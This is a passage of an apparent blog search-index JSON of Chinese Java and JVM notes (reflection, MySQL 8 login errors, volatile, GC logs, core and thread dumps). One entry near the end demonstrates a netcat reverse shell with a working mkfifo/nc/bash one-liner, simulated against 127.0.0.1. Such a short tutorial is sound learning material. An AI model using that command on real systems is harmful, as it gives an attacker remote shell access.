class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;Method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Boundary&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Method&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;(&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;Parameter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getParameters&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Parameter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameters&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parameter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;)&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } 编译时加了参数javac -parameters 时输出如下： hello(java.lang.String name int age ) 没有加参数-parameters 时输出结果如下： hello(java.lang.String arg0 int arg1 ) ASM + 编译时加上调试信息 Java8以前编译时加上debug info via javac -g option 没有加-g选项时只有源文件和行号调试信息；加了-g选项后会包括本地变量调试信息（LocalVariableTable），比如变量名。 再通过Spring LocalVariableTableParameterNameDiscoverer获取 source: Source file debugging information. lines: Line number debugging information. vars: Local variable debugging information. 使用场景 @PathVariable @RequestParam @RequestHeade ",
      "url"      : "http://localhost:4000/2018/09/02/java-parameter-name/"
    } ,
  
    {
      "title"    : "mysql8 Workbench连接问题",
      "category" : "mysql8",
      "content": "升级到mysql8以后，原有的Mysql Workbench连接出现下面的异常 Authentication plugin 'caching_sha2_password' cannot be loaded: dlopen(/usr/local/mysql/lib/plugin/caching_sha2_password.so, 2): image not found 原因 mysql客户端不支持caching_sha2_password; mysql8新建用户默认采用这种加密方式 mysqladmin -uroot password 'mypassword' 解决方法 修改服务端用户密码加密方式为mysql_native_password ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'mypassword'; ",
      "url"      : "http://localhost:4000/2018/09/10/mysql8/"
    } ,
  
    {
      "title"    : "Java annotation的继承性",
      "category" : "java annotation",
      "content": "Java annotation只能从超类继承不能从接口继承 Javadoc Indicates that an annotation type is automatically inherited. If an Inherited meta-annotation is present on an annotation type declaration, and the user queries the annotation type on a class declaration, and the class declaration has no annotation for this type, then the class's superclass will automatically be queried for the annotation type. This process will be repeated until an annotation for this type is found, or the top of the class hierarchy (Object) is reached. If no superclass has an annotation for this type, then the query will indicate that the class in question has no such annotation. Note that this meta-annotation type has no effect if the annotated type is used to annotate anything other than a class. Note also that this meta-annotation only causes annotations to be inherited from superclasses; annotations on implemented interfaces have no effect. ",
      "url"      : "http://localhost:4000/2018/09/14/java-annotation/"
    } ,
  
    {
      "title"    : "Java类型检查",
      "category" : "Java",
      "content": "Java类型转换前一般有三种方式进行类型检查 isAssignableFrom isInstance instanceof isAssignableFrom X.class.isAssignableFrom(Y.class) If X and Y are the same class, or X is Y's super class or super interface, return true, otherwise, false isInstance X.class.isInstance(y) Say y is an instance of class Y, if X and Y are the same class, or X is Y's super class or super interface, return true, otherwise, false. instanceof x instanceof X For instanceof you need to know the exact class X at compile time. ",
      "url"      : "http://localhost:4000/2018/09/23/java-type-check/"
    } ,
  
    {
      "title"    : "链接收藏",
      "category" : "收藏",
      "content": "收藏的链接地址 Java泛型 ",
      "url"      : "http://localhost:4000/2018/09/24/favoriate-url/"
    } ,
  
    {
      "title"    : "Java 对象大小",
      "category" : "Java",
      "content": "java对象内存layout Class : A pointer to the class information, which describes the object type. In the case of a java.lang.Integer object, for example, this is a pointer to the java.lang.Integer class. Flags : A collection of flags that describe the state of the object, including the hash code for the object if it has one, and the shape of the object (that is, whether or not the object is an array). Lock : The synchronization information for the object — that is, whether the object is currently synchronized. 参考 ",
      "url"      : "http://localhost:4000/2018/10/03/java-object-size/"
    } ,
  
    {
      "title"    : "getMethods 和 getDeclaredMethods",
      "category" : "java",
      "content": "getMethods和getDeclaredMethods的区别 getMethods public Method[] getMethods() throws SecurityException Returns an array containing Method objects reflecting all the public methods of the class or interface represented by this Class object, including those declared by the class or interface and those inherited from superclasses and superinterfaces. getDeclaredMethods public Method[] getDeclaredMethods() throws SecurityException Returns an array containing Method objects reflecting all the declared methods of the class or interface represented by this Class object, including public, protected, default (package) access, and private methods, but excluding inherited methods. 备注 下面反射方法类似。 getDeclaredFields 和 getFields getDeclaredField 和 getField ",
      "url"      : "http://localhost:4000/2018/10/05/java-reflect/"
    } ,
  
    {
      "title"    : "为什么InputStream read返回int",
      "category" : "Java",
      "content": "Java InputStream read返回int 问题 InputStream 操作的是字节流，read字面上理解应该返回字节，为什么api中返回的是int public abstract int read()    throws IOException Reads the next byte of data from the input stream. The value byte is returned as an int in the range 0 to 255. If no byte is available because the end of the stream has been reached, the value -1 is returned. This method blocks until input data is available, the end of the stream is detected, or an exception is thrown. A subclass must provide an implementation of this method. Returns: the next byte of data, or -1 if the end of the stream is reached. Throws: IOException - if an I/O error occurs. 原因 byte表示的范围是-128～127，不能表示0～255 EOF（-1）？ 为什么不用short的原因是int效率更高（字节对齐？），虽然内存占用会大一些 参考 SOF ",
      "url"      : "http://localhost:4000/2018/10/07/java-inputstream-read/"
    } ,
  
    {
      "title"    : "Java volatile",
      "category" : "java",
      "content": "Java volatile volatile 语义 内存可见性，不保证原子性（++i） 禁止指令重排 (单例设计模式) 保证double/long的读写原子性（不然32bit+32bit操作会有不一致） 关于第三点，可以参考jls 17.7. Non-atomic Treatment of double and long For the purposes of the Java programming language memory model, a single write to a non-volatile long or double value is treated as two separate writes: one to each 32-bit half. This can result in a situation where a thread sees the first 32 bits of a 64-bit value from one write, and the second 32 bits from another write. Writes and reads of volatile long and double values are always atomic. Writes to and reads of references are always atomic, regardless of whether they are implemented as 32-bit or 64-bit values. Some implementations may find it convenient to divide a single write action on a 64-bit long or double value into two write actions on adjacent 32-bit values. For efficiency's sake, this behavior is implementation-specific; an implementation of the Java Virtual Machine is free to perform writes to long and double values atomically or in two parts. Implementations of the Java Virtual Machine are encouraged to avoid splitting 64-bit values where possible. Programmers are encouraged to declare shared 64-bit values as volatile or synchronize their programs correctly to avoid possible complications. ",
      "url"      : "http://localhost:4000/2018/10/07/java-volatile/"
    } ,
  
    {
      "title"    : "Java泛型",
      "category" : "java",
      "content": "Java generic（泛型）笔记 extends 和 super public static &lt;T extends Comparable&lt;? super T&gt;&gt; void sort(List&lt;T&gt; list) {  list.sort(null);  } 这里的泛型方法中的T要么它自己，要么它的父类需要 implements Comparable。理解起来是要么按照T的属性或者T的父类属性排序。 SOF ",
      "url"      : "http://localhost:4000/2018/10/08/java-generic/"
    } ,
  
    {
      "title"    : "jacoco powermockito集成",
      "category" : "jacoco",
      "content": "jacoco powermockito 集成 jacoco集成power mockito后report不能显示代码覆盖率时可以采用offline pom方式。参考例子如下 jacoco offline pom sample &lt;?xml version=1.0 encoding=UTF-8?&gt; &lt;!-- Copyright (c) 2009, 2018 Mountainminds GmbH &amp; Co. KG and Contributors All rights reserved. This program and the accompanying materials are made available under the terms of the Eclipse Public License v1.0 which accompanies this distribution, and is available at http://www.eclipse.org/legal/epl-v10.html Contributors: Evgeny Mandrikov - initial API and implementation --&gt; &lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;org.jacoco&lt;/groupId&gt; &lt;artifactId&gt;org.jacoco.examples.maven&lt;/artifactId&gt; &lt;version&gt;@project.version@&lt;/version&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;name&gt;JaCoCo Maven plug-in example with Offline Instrumentation&lt;/name&gt; &lt;url&gt;http://www.jacoco.org/jacoco&lt;/url&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.10&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;!-- must be on the classpath --&gt; &lt;groupId&gt;org.jacoco&lt;/groupId&gt; &lt;artifactId&gt;org.jacoco.agent&lt;/artifactId&gt; &lt;classifier&gt;runtime&lt;/classifier&gt; &lt;version&gt;@project.version@&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;1.5&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.5&lt;/maven.compiler.target&gt; &lt;/properties&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.jacoco&lt;/groupId&gt; &lt;artifactId&gt;jacoco-maven-plugin&lt;/artifactId&gt; &lt;version&gt;@project.version@&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;default-instrument&lt;/id&gt; &lt;goals&gt; &lt;goal&gt;instrument&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;execution&gt; &lt;id&gt;default-restore-instrumented-classes&lt;/id&gt; &lt;goals&gt; &lt;goal&gt;restore-instrumented-classes&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;execution&gt; &lt;id&gt;default-report&lt;/id&gt; &lt;goals&gt; &lt;goal&gt;report&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;execution&gt; &lt;id&gt;default-check&lt;/id&gt; &lt;goals&gt; &lt;goal&gt;check&lt;/goal&gt; &lt;/goals&gt; &lt;configuration&gt; &lt;rules&gt; &lt;!-- implementation is needed only for Maven 2 --&gt; &lt;rule implementation=&quot;org.jacoco.maven.RuleConfiguration&quot;&gt; &lt;element&gt;BUNDLE&lt;/element&gt; &lt;limits&gt; &lt;!-- implementation is needed only for Maven 2 --&gt; &lt;limit implementation=&quot;org.jacoco.report.check.Limit&quot;&gt; &lt;counter&gt;COMPLEXITY&lt;/counter&gt; &lt;value&gt;COVEREDRATIO&lt;/value&gt; &lt;minimum&gt;0.60&lt;/minimum&gt; &lt;/limit&gt; &lt;/limits&gt; &lt;/rule&gt; &lt;/rules&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt; &lt;version&gt;2.12.2&lt;/version&gt; &lt;configuration&gt; &lt;systemPropertyVariables&gt; &lt;jacoco-agent.destfile&gt;target/jacoco.exec&lt;/jacoco-agent.destfile&gt; &lt;/systemPropertyVariables&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/project&gt; ",
      "url"      : "http://localhost:4000/2019/01/02/jacoco/"
    } ,
  
    {
      "title"    : "2018年终总结",
      "category" : "dairy",
      "content": "2018年终总结 总的来说，2018是折腾的一年，2019仍然充满未知和期待。 2018也是很有趣的一年，碰到很多有趣的人，经历几个有趣的项目。自己视野开阔了一些，世界这么大，我想溜达溜达。 2018是穷忙的一年，加了不少班，结果没有看到。三个字，自找的。 欣慰的是，2018年亲人身体安康，爸爸虽然年初来了点小插曲，冥冥中竟然帮了我。另外，作为大龄老程序员，仍然坚守技术一线并对技术充满热情，对自己点赞。 2019年新的平台，充满了未知。自己选择了，必须坚持。 ",
      "url"      : "http://localhost:4000/2019/01/02/year-summary/"
    } ,
  
    {
      "title"    : "linux shell seq",
      "category" : "shell",
      "content": "循环中可以执行与时序相关的shell命令。 max=10 for i in `seq 1 25` do  echo $i done ",
      "url"      : "http://localhost:4000/2019/02/22/for-loop-shell/"
    } ,
  
    {
      "title"    : "Mock static",
      "category" : "powerMock",
      "content": "mock static @RunWith(PowerMockRunner.class) @PrepareForTest({X.class, Y.class, Z.class}) @SuppressStaticInitializationFor(some.package.ClassWithStaticInit) ",
      "url"      : "http://localhost:4000/2019/02/22/power-mock/"
    } ,
  
    {
      "title"    : "CMS GC日志格式",
      "category" : "JVM",
      "content": "CMS GC日志，STW阶段有initial-mark,remark;并发阶段有concurrent mark,concurrent preclean,concurrent sweep,concurrent reset [GC [1 CMS-initial-mark: 13991K(20288K)] 14103K(22400K), 0.0023781 secs] [GC [DefNew: 2112K-&gt;64K(2112K), 0.0837052 secs] 16103K-&gt;15476K(22400K), 0.0838519 secs] ... [GC [DefNew: 2077K-&gt;63K(2112K), 0.0126205 secs] 17552K-&gt;15855K(22400K), 0.0127482 secs] [CMS-concurrent-mark: 0.267/0.374 secs] [GC [DefNew: 2111K-&gt;64K(2112K), 0.0190851 secs] 17903K-&gt;16154K(22400K), 0.0191903 secs] [CMS-concurrent-preclean: 0.044/0.064 secs] [GC [1 CMS-remark: 16090K(20288K)] 17242K(22400K), 0.0210460 secs] [GC [DefNew: 2112K-&gt;63K(2112K), 0.0716116 secs] 18177K-&gt;17382K(22400K), 0.0718204 secs] [GC [DefNew: 2111K-&gt;63K(2112K), 0.0830392 secs] 19363K-&gt;18757K(22400K), 0.0832943 secs] ... [GC [DefNew: 2111K-&gt;0K(2112K), 0.0035190 secs] 17527K-&gt;15479K(22400K), 0.0036052 secs] [CMS-concurrent-sweep: 0.291/0.662 secs] [GC [DefNew: 2048K-&gt;0K(2112K), 0.0013347 secs] 17527K-&gt;15479K(27912K), 0.0014231 secs] [CMS-concurrent-reset: 0.016/0.016 secs] [GC [DefNew: 2048K-&gt;1K(2112K), 0.0013936 secs] 17527K-&gt;15479K(27912K), 0.0014814 secs ] CMS日志格式 ",
      "url"      : "http://localhost:4000/2019/02/24/GC-CMS/"
    } ,
  
    {
      "title"    : "Java Core Dump",
      "category" : "JVM",
      "content": "Java Core Dump分析 Java程序运行时，有时会产生hs_err_pid.log及core Dump文件。发生core dump后，Java进程有时可以继续运行，但有时会挂掉。core dump文件保留了Java应用发生致命错误前的运行状态 如何生成core dump文件 echo /var/tmp/cores/%e-%p-%t.core &gt; /proc/sys/kernel/core_pattern -XX:ErrorFile=./hs_err_pid&lt;pid&gt;.log 生成的文件 二进制文件 java-[pid]-[unix时间].core 获取文件位置 $ cat /proc/sys/kernel/core_pattern /var/tmp/cores/%e-%p-%u.core $ ls /var/tmp/cores java-21178-146385.core # # A fatal error has been detected by the Java Runtime Environment: # # SIGBUS (0x7) at pc=0x00007fde40016a32, pid=7808, tid=0x00007fde4075b700 # # JRE version: Java(TM) SE Runtime Environment (8.0_92-b14) (build 1.8.0_92-b14) # Java VM: Java HotSpot(TM) 64-Bit Server VM (25.92-b14 mixed mode linux-amd64 compressed oops) # Problematic frame: # C [libzip.so+0x11a32] newEntry+0x62 # # Failed to write core dump. Core dumps have been disabled. To enable core dumping, try &quot;ulimit -c unlimited&quot; before starting Java again # # If you would like to submit a bug report, please visit: # http://bugreport.java.com/bugreport/crash.jsp # The crash happened outside the Java Virtual Machine in native code. # See problematic frame for where to report the bug. # hs_err_pid[pid].log java应用崩溃日志中可以看到hs_err-pid[pid].log文件位置 # # A fatal error has been detected by the Java Runtime Environment: # # SIGSEGV (0xb) at pc=0x00000000000010c6, pid=2446, tid=140570273433344 # # JRE version: Java(TM) SE Runtime Environment (8.0_66-b17) (build 1.8.0_66-b17) # Java VM: Java HotSpot(TM) 64-Bit Server VM (25.66-b17 mixed mode linux-amd64 compressed oops) # Problematic frame: # C 0x00000000000010c6 # # Core dump written. Default location: /home/ewallet/quhua/quhua-online/default/tomcat/core or core.2446 # # An error report file with more information is saved as: # /home/default/tomcat/hs_err_pid2446.log # # If you would like to submit a bug report, please visit: # http://bugreport.java.com/bugreport/crash.jsp # 文本文件 hs_err_pid[pid].log # # A fatal error has been detected by the Java Runtime Environment: # # SIGSEGV (0xb) at pc=0x0000003797807a91, pid=29071, tid=139901421901568 # # JRE version: Java(TM) SE Runtime Environment (8.0_45-b14) (build 1.8.0_45-b14) # Java VM: Java HotSpot(TM) 64-Bit Server VM (25.45-b02 mixed mode linux-amd64 compressed oops) # Problematic frame: # C [libresolv.so.2+0x7a91] __libc_res_nquery+0x1c1 # # Failed to write core dump. Core dumps have been disabled. To enable core dumping, try &quot;ulimit -c unlimited&quot; before starting Java again # # If you would like to submit a bug report, please visit: # http://bugreport.java.com/bugreport/crash.jsp # The crash happened outside the Java Virtual Machine in native code. # See problematic frame for where to report the bug. # --------------- T H R E A D --------------- Current thread (0x0000000001e94800): JavaThread &quot;pool-1-thread-2&quot; [_thread_in_native, id=30111, stack(0x00007f3d567e5000,0x00007f3d568e6000)] siginfo: si_signo: 11 (SIGSEGV), si_code: 1 (SEGV_MAPERR), si_addr: 0x0000000000000003 Registers: RAX=0x0000000000000000, RBX=0x0000000000000000, RCX=0x0000000000000000, RDX=0x0000000000000050 RSP=0x00007f3d568e2280, RBP=0x00007f3d568e2570, RSI=0x0000000000000000, RDI=0x00000000ffffffff R8 =0x0000000000000000, R9 =0x0000000000000000, R10=0x000000000007a337, R11=0x0000000000000213 R12=0x00007f3d568e2ef0, R13=0x00007f3d568e22b0, R14=0x0000000000000000, R15=0x00007f3d568e5db8 RIP=0x0000003797807a91, EFLAGS=0x0000000000010246, CSGSFS=0x0000000000000033, ERR=0x0000000000000004 TRAPNO=0x000000000000000e Top of Stack: (sp=0x00007f3d568e2280) 0x00007f3d568e2280: b8e4bfb900000800 00007f3d568e3760 0x00007f3d568e2290: 00007f3d568e3758 00007f3d568e377c 0x00007f3d568e22a0: 00007f3d568e3778 6f6e6b6e56a88a58 0x00007f3d568e22b0: 00000100000149a0 7a68710800000000 0x00007f3d568e22c0: 6970067363642d78 6d6f63036e61676e ....省略 Instructions: (pc=0x0000003797807a91) 0x0000003797807a71: 48 89 45 b8 48 8b 4d b8 0f b6 51 03 89 d3 83 e3 0x0000003797807a81: 0f 75 0d 0f b7 49 06 66 c1 c9 08 66 85 c9 75 4f 0x0000003797807a91: 0f b6 48 03 bf 0f 00 00 00 40 20 cf 75 0d 0f b7 0x0000003797807aa1: 70 06 66 c1 ce 08 66 85 f6 75 34 83 e1 0f 83 e2 Register to memory mapping: RAX=0x0000000000000000 is an unknown value RBX=0x0000000000000000 is an unknown value RCX=0x0000000000000000 is an unknown value RDX=0x0000000000000050 is an unknown value RSP=0x00007f3d568e2280 is pointing into the stack for thread: 0x0000000001e94800 RBP=0x00007f3d568e2570 is pointing into the stack for thread: 0x0000000001e94800 ... 省略 如何分析 从hs-err-pid[pid].log文件中获取core dump线程id gdb (gdb) set solib-search-path $JAVA_HOME/jre/bin/ (gdb) file $JAVA_HOME/jre/bin/java (gdb) core java-230270-1551171676.core (gdb) bt or (gdb) where jstack 找到问题线程堆栈 jstack -J-d64 $JAVA_HOME/bin/java /var/tmp/cores/java-[pid]-[unix time].core jmap jmap $JAVA_HOME/bin/java /var/tmp/cores/java-[pid]-[unix time].core ",
      "url"      : "http://localhost:4000/2019/03/03/java-core-dump/"
    } ,
  
    {
      "title"    : "Java Agent",
      "category" : "JVM Instrument",
      "content": "Java Agent机制 两个线程 Signal Dispatcher(随jvm启动而启动,处理信号) Attach Listener, 这个线程通过Unix Domain Socket跟外部进程通讯（.java_pid） On Linux and Solaris, the client creates a file named .attach_pid and sends a SIGQUIT to the target JVM process. The existence of this file causes the SIGQUIT handler in HotSpot to start the attach listener thread. 注意 kill -3 并不会杀死java进程。默认行为是产生thread dump。除非JVM中重新定义了SIGQUIT(-3)的处理handler。产生JVM thread dump kill -3 pid 两个文件 .attach_pid （启动attach listener线程用） .java_pid （Unix socket domain） 参考 LinuxVirtualMachine 你假笨@JVM 非java进程attach JVM ",
      "url"      : "http://localhost:4000/2019/03/17/java-attach/"
    } ,
  
    {
      "title"    : "Java Boot Classpath",
      "category" : "",
      "content": " layout: post title: 修改boot classpath categories: [JVM] 在boot classpath前面或者后面添加JAR 后面增加JAR java -Xbootclasspath/a:&quot;/path/to/my/folder/classes&quot; Test1 -Xbootclasspath/a:path Specify a colon-separated path of directires, JAR archives, and ZIP archives to append to the default bootstrap class path. 前面增加JAR -Xbootclasspath/p:path Specify a colon-separated path of directires, JAR archives, and ZIP archives to prepend in front of the default bootstrap class path. Note: Applications that use this option for the purpose of overriding a class in rt.jar should not be deployed as doing so would contravene the Java 2 Runtime Environment binary code license. ",
      "url"      : "http://localhost:4000/2019/03/29/java-boot-classpath/"
    } ,
  
    {
      "title"    : "Java thread Dump",
      "category" : "JVM",
      "content": "java thread dump分析 产生方式 jstack -l [pid] kill -3 [pid] // When the specified process is running on a 64-bit Java Virtual Machine, you might need to specify the -J-d64 option jstack -J-d64 [core dump文件] SMR线程 This section contains the thread list Safe Memory Reclamation (SMR) information1, which enumerates the addresses of all non-JVM internal threads (e.g. non-VM and non-Garbage Collection (GC)). Threads class SMR info: _java_thread_list=0x00000250e5488a00, length=13, elements={ 0x00000250e4979000, 0x00000250e4982800, 0x00000250e52f2800, 0x00000250e4992800, 0x00000250e4995800, 0x00000250e49a5800, 0x00000250e49ae800, 0x00000250e5324000, 0x00000250e54cd800, 0x00000250e54cf000, 0x00000250e54d1800, 0x00000250e54d2000, 0x00000250e54d0800 } &quot;Reference Handler&quot; #2 daemon prio=10 os_prio=2 tid=0x00000250e4979000 nid=0x3c28 waiting on condition [0x000000b82a9ff000] &quot;Finalizer&quot; #3 daemon prio=8 os_prio=1 tid=0x00000250e4982800 nid=0x2a54 in Object.wait() [0x000000b82aaff000] &quot;Signal Dispatcher&quot; #4 daemon prio=9 os_prio=2 tid=0x00000250e52f2800 nid=0x2184 runnable [0x0000000000000000] &quot;Attach Listener&quot; #5 daemon prio=5 os_prio=2 tid=0x00000250e4992800 nid=0x1624 waiting on condition [0x0000000000000000] &quot;C2 CompilerThread0&quot; #6 daemon prio=9 os_prio=2 tid=0x00000250e4995800 nid=0x4198 waiting on condition [0x0000000000000000] &quot;C2 CompilerThread1&quot; #7 daemon prio=9 os_prio=2 tid=0x00000250e49a5800 nid=0x3b98 waiting on condition [0x0000000000000000] &quot;C1 CompilerThread2&quot; #8 daemon prio=9 os_prio=2 tid=0x00000250e49ae800 nid=0x1a84 waiting on condition [0x0000000000000000] &quot;Sweeper thread&quot; #9 daemon prio=9 os_prio=2 tid=0x00000250e5324000 nid=0x5f0 runnable [0x0000000000000000] &quot;Service Thread&quot; #10 daemon prio=9 os_prio=0 tid=0x00000250e54cd800 nid=0x169c runnable [0x0000000000000000] &quot;Common-Cleaner&quot; #11 daemon prio=8 os_prio=1 tid=0x00000250e54cf000 nid=0x1610 in Object.wait() [0x000000b82b2fe000] &quot;Thread-0&quot; #12 prio=5 os_prio=0 tid=0x00000250e54d1800 nid=0xdec waiting for monitor entry [0x000000b82b4ff000] &quot;Thread-1&quot; #13 prio=5 os_prio=0 tid=0x00000250e54d2000 nid=0x415c waiting for monitor entry [0x000000b82b5ff000] &quot;DestroyJavaVM&quot; #14 prio=5 os_prio=0 tid=0x00000250e54d0800 nid=0x2b8c waiting on condition [0x0000000000000000] VM和GC线程 &quot;VM Thread&quot; os_prio=2 tid=0x00000250e496d800 nid=0x1920 runnable &quot;GC Thread#0&quot; os_prio=2 tid=0x00000250c35b5800 nid=0x310c runnable &quot;GC Thread#1&quot; os_prio=2 tid=0x00000250c35b8000 nid=0x12b4 runnable &quot;GC Thread#2&quot; os_prio=2 tid=0x00000250c35ba800 nid=0x43f8 runnable &quot;GC Thread#3&quot; os_prio=2 tid=0x00000250c35c0800 nid=0x20c0 runnable &quot;G1 Main Marker&quot; os_prio=2 tid=0x00000250c3633000 nid=0x4068 runnable &quot;G1 Conc#0&quot; os_prio=2 tid=0x00000250c3636000 nid=0x3e28 runnable &quot;G1 Refine#0&quot; os_prio=2 tid=0x00000250c367e000 nid=0x3c0c runnable &quot;G1 Refine#1&quot; os_prio=2 tid=0x00000250e47fb800 nid=0x3890 runnable &quot;G1 Refine#2&quot; os_prio=2 tid=0x00000250e47fc000 nid=0x32a8 runnable &quot;G1 Refine#3&quot; os_prio=2 tid=0x00000250e47fd800 nid=0x3d00 runnable &quot;G1 Young RemSet Sampling&quot; os_prio=2 tid=0x00000250e4800800 nid=0xef4 runnable &quot;VM Periodic Task Thread&quot; os_prio=2 tid=0x00000250e54d6800 nid=0x3468 waiting on condition ",
      "url"      : "http://localhost:4000/2019/03/30/java-thread-dump/"
    } ,
  
    {
      "title"    : "反弹shell",
      "category" : "安全",
      "content": "反弹shell（reverse shell) mac下单机模拟反弹shell 攻击机 通过netcat建立反弹shell,待受害机建立链接后，通过bash shell远程执行命令 nc -lv 7777 受害机mkfifo myfifo nc 127.0.0.1 7777 &lt; myfifo | /bin/bash -i &gt; myfifo 2&gt;&amp;1 参考 mac reverse shell ",
      "url"      : "http://localhost:4000/2019/07/06/reverse-shell/"
    } ,
  
    {
      "title"    : "自定义ClassLoader热加载jar文件中的类",
      "category" : "JDK",
